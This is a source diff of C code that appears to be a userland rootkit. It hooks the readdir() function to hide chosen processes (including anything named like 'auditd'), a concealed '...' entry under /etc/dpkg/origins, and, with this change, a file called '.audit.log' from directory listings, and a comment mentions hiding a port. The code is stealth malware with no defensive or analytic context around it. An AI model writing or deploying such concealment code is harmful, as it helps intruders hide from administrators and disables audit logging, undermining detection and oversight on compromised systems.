@@ -11,7 +11,11 @@
  */
 static const char* process_to_filter = "agente.py";
 static const char* process_to_filter2 = "auditd";
-static const char* process_to_filter3 = "mala";
+
+/*
+ * File to filter
+ */
+static const char* file_to_filter = ".audit.log";
 
 /*
  * Port to hide
@@ -118,8 +122,8 @@ struct dirent* readdir(DIR *dirp)                                       \
                     strcmp(process_name, process_to_filter) == 0) ||    \
                 (strcmp(dir_name, "/etc/dpkg/origins") == 0 &&          \
                     strcmp(dir->d_name, "...")==0) ||                   \
-                (strstr(process_name, process_to_filter2) != NULL) ||      \
-                (strcmp(process_name, process_to_filter3) == 0))){      \
+                (strstr(process_name, process_to_filter2) != NULL) ||   \
+                (strcmp(dir->d_name, file_to_filter) == 0))) {          \
                 continue;                                               \
             }                                                           \
         }                                                               \
